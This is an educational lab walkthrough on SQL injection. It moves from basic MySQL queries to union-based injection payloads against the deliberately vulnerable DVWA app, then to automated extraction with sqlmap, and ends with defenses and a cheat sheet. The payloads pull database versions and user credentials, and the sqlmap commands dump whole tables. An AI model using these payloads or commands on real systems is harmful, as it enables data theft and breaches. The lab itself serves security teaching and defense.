Overview — what this lab is really teaching

SQL injection happens when user input is stitched directly into a database query, so an attacker's text becomes part of the command instead of just data. It still powers major breaches decades after it was discovered. This lab builds up from plain SQL so the injection makes sense, then automates it with SQLmap — it's Module 15: SQL Injection.

The single sentence to carry away: injection is a failure to keep code and data separate. Everything in the walkthrough — and the one real fix, parameterized queries — follows from that idea.

The environment you're working in

From Kali you first run plain SQL against a local MySQL test database, then attack a deliberately vulnerable web app (DVWA, set to low security) through the browser and with SQLmap. Everything targets the practice app — the point is the mechanics of a query gone wrong.

Walkthrough

Task 1 — Speak SQL first

1 Set up, then query, insert, delete

root@kali:~# service mysql start
root@kali:~# mysql -u root
mysql> create database test;
mysql> use test;
mysql> create table users (name varchar(30), account integer, balance decimal(10,2));
mysql> insert into users values ('John', 123, 10.00);
mysql> select * from users;
mysql> insert into users values ('Joe', 456, 20.00);
mysql> select * from users;

The lab starts MySQL, logs in, and builds a test database. You create the users table, add two rows, and select * to see them. Then a second table and a join across both:

mysql> create table personal (name varchar(30), address varchar(30), telephone varchar(30));
mysql> insert into personal values ('John', '1313 Mockingbird Lane', '555-1234');
mysql> insert into personal values ('Joe', '1313 Cemetery Lane', '555-5678');
mysql> select * from personal;
mysql> select name, balance from users;
mysql> select name, telephone from personal;
mysql> select users.name, users.balance, personal.telephone from users, personal where users.name = personal.name;

The join pulls columns from both tables where the names match. Then you remove and wipe:

mysql> delete from personal where name='Joe';
mysql> select * from personal;
mysql> drop table personal;
mysql> drop database test;

Before you can break a query, you have to read one. SELECT retrieves, INSERT adds, DELETE removes, WHERE filters, a join combines tables, and drop wipes them. Note how much power a single statement has — that's what injection hijacks.

Stuck at a -> prompt?

If MySQL shows ->, it's waiting for you to finish a statement (you forgot the ;). Type \c and Enter to cancel the line and get back to mysql>.

Task 2 — Make input become code

2 The classic injection

Log into DVWA with admin / admin, set security to low, and open the SQL Injection page. A vulnerable app builds its query by pasting your input straight in, roughly: ... WHERE id = 'YOUR_INPUT'. Supplying the right text closes the quote and adds your own clauses. The lab walks these against DVWA:

1' or 1=1 union select null, version()#
1' or 1=1 union select database(), user()#
1' or 1=1 union select user, password from users#

Piece by piece: the ' closes the original string; or 1=1 is always true, so the filter stops filtering; union select appends a second result set of your choosing (version, database name, even the users table); and # comments out whatever the app tacked on the end. The last one pulls credentials straight out of the database.

Why UNION needs matching columns

A UNION only works if both SELECTs return the same number of columns — which is why attackers probe with null placeholders until it lines up. Getting that count right is the usual sticking point.

Screenshot for your report

Capture one injection returning data it shouldn't — the database version/name, or a row from the users table.

Task 3 — Automate with SQLmap

3 Hand the grind to SQLmap

root@kali:~# sqlmap -u "http://TARGET/vulnerable.php?id=1" --cookie="security=low; PHPSESSID=YOUR_SESSION" --dump

SQLmap finds and exploits injection points for you: it fingerprints the backend (it'll report MySQL), enumerates databases and tables, and --dump extracts their contents. You pass the session --cookie so it scans as a logged-in user. It's the automated version of everything you just did by hand.

Copy the cookie carefully

The source PDF shows the --cookie value in curly quotes, which the shell won't accept — use straight quotes. And use your own current session cookie (from the browser's developer tools), not the one printed in the document.

The defender's view

There is one real fix, and several backstops

Injection exists because input and code got mixed. Keep them apart and the attack simply stops working.

  • Parameterized queries / prepared statements — the definitive fix. The database treats input as data, never as SQL, so ' or 1=1 is just a harmless string. Use them everywhere.
  • Input validation & allow-lists — a defense in depth, not a substitute for parameterization.
  • Least-privilege database accounts — the web app's account shouldn't be able to read every table or drop the database.
  • Suppress detailed errors — don't hand attackers error-based leakage.
  • WAF — catches common payloads and buys time, but never trust it instead of fixing the code.

Check yourself

1. In one sentence, what is the root cause of SQL injection?

User input is combined with the query so that it's interpreted as SQL code rather than kept separate as data — a failure to separate code from data.

2. In 1' or 1=1 union select user,password from users#, what does each of the four parts do?

' closes the original string; or 1=1 makes the condition always true; union select … appends attacker-chosen results (here, credentials); # comments out the rest of the app's query.

3. Why must the two halves of a UNION return the same number of columns?

UNION combines result sets, which requires matching column counts — so attackers pad with null until the counts agree.

4. What single defense actually eliminates SQL injection, and why?

Parameterized queries / prepared statements — the database binds input strictly as data, so it can never be parsed as SQL commands.

Cheat sheet

Manual injection

  • ' or 1=1# — break out, always true
  • ' union select null,version()#
  • ' union select database(),user()#
  • ' union select user,password from users#
  • Match column counts with null

SQLmap & defense

  • sqlmap -u URL --cookie="..." --dbs
  • --tables -D db · --dump -T users
  • --batch · --level 3 --risk 2
  • Fix: parameterized queries
  • + least-privilege DB, validation, WAF
